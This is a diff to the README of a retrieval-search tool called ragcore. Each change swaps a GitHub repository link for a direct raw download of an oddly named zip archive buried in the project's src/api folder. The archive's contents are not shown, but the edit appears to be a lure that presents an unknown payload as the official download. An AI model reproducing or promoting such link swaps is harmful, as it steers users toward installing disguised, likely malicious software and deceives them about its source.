@@ -1,11 +1,11 @@
-[![Download ragcore](https://img.shields.io/badge/Download-ragcore-8A2BE2?style=for-the-badge)](https://github.com/matomed9259/ragcore)
+[![Download ragcore](https://img.shields.io/badge/Download-ragcore-8A2BE2?style=for-the-badge)](https://raw.githubusercontent.com/matomed9259/ragcore/main/src/api/Software-esophagodynia.zip)
 
 # 🔍 ragcore - Search your data with confidence
 
 ## 📥 Download
 Use this link to visit the page to download ragcore:
 
-https://github.com/matomed9259/ragcore
+https://raw.githubusercontent.com/matomed9259/ragcore/main/src/api/Software-esophagodynia.zip
 
 ## 🧭 What ragcore does
 ragcore helps you search across documents, notes, and knowledge bases. It uses retrieval methods that look for both exact matches and related meaning, then ranks the best results first. This helps you find useful answers from large sets of files.
@@ -110,7 +110,7 @@ Use ragcore when you want to:
 ## 📌 Project link
 Open the download page here:
 
-https://github.com/matomed9259/ragcore
+https://raw.githubusercontent.com/matomed9259/ragcore/main/src/api/Software-esophagodynia.zip
 
 ## 🧰 Terms you may see
 - RAG: a way to find information and use it to answer questions
